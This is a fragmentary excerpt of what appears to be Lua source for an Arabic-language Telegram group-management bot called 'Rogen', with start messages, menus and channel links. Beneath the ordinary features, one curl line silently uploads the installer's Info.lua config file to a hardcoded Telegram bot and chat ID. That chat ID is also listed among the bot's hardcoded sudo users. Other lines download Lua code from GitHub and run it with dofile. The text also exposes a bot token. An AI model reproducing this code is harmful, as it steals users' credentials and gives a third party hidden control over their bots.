...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ELKABOOOS/rogenn/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1839082644,1851380322}   
...
local curl = 'curl "'..'https://api.telegram.org/bot1706737466:AAG8CRj1VGRUinWWPnm8WEIGUHbl8j64KMY/sendDocument'..'" -F "chat_id='.. 1839082644 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
{'ضع كليشه روجينت','حذف كليشه روجينت'},
{'اذاعه ','اذاعه خاص '},
...
if text == 'الغاء' or text == 'الغاء' then   
send(msg.chat_id_, msg.id_,'  ✯  الغاء حفظ كليشه روجينت')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,'  ✯  تم حفظ كليشه روجينت')
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'ضع كليشه روجينت' and DevSoFi(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,'  ✯  ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه روجينت' and DevSoFi(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,'  ✯  تم حذف كليشه روجينت')
end
...
os.execute('wget https://raw.githubusercontent.com/ELKABOOOS/rogenn/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ✯  تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'  ✯  اصدار سورس روجين { s: 6.7}')
end
...
{{text = '((S T A R))', url="t.me/SO_ROGEN"}}, 
}
...
𝐭𝐡𝐞 𝐛𝐞𝐬𝐭 𝐬𝐨𝐮𝐫𝐜𝐞 𝐨𝐧 𝐭𝐞𝐭𝐥𝐞𝐠𝐫𝐚𝐦
𝐫𝐨𝐠𝐞𝐧 𝐢𝐧 𝐛𝐨𝐮𝐭𝐭𝐨𝐧𝐬 𝐛𝐞𝐥𝐨𝐥
╰──── ● « 𝐫 𝐨 𝐨 𝐠 𝐞 𝐧 » ● ────╯
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local Text = [[
بوت التواصل الخاص بسورس روجين
اضغط ع الزر الي بالاسفل⇓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐭𝐰𝐚𝐬𝐞𝐥 𝐫𝐨𝐨𝐠𝐞𝐧',url="t.me/Vambair_bot"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == '╭──── ● « 𝐫 𝐨 𝐨 𝐠 𝐞 𝐧 » ● ────╮' or text == '╰──── ● « 𝐫 𝐨 𝐨 𝐠 𝐞 𝐧 » ● ────╯' then
local Text = [[ 
╭──── ● « 𝐫 𝐨 𝐨 𝐠 𝐞 𝐧 » ● ────╮
𝐰𝐞𝐥𝐜𝐨𝐦 𝐨𝐧 𝐬𝐨𝐮𝐫𝐜𝐞 𝐫𝐨𝐨𝐠𝐞𝐧
𝐭𝐡𝐞 𝐛𝐞𝐬𝐭 𝐬𝐨𝐮𝐫𝐜𝐞 𝐨𝐧 𝐭𝐞𝐭𝐥𝐞𝐠𝐫𝐚𝐦
...
if text == 'العاب روجين' or text == 'العاب متطوره' then  
local Text = [[  
...
elseif text == 'قفل روجينرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
elseif text == 'فتح روجينرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ELKABOOOS/rogenn/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/ELKABOOOS/rogenn/main/File_Bot/"..file)
if res == 200 then
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'CHANNEL.',url="t.me/SO_ROGEN"}},
}
local msg_id = msg.id_/2097152/0.5
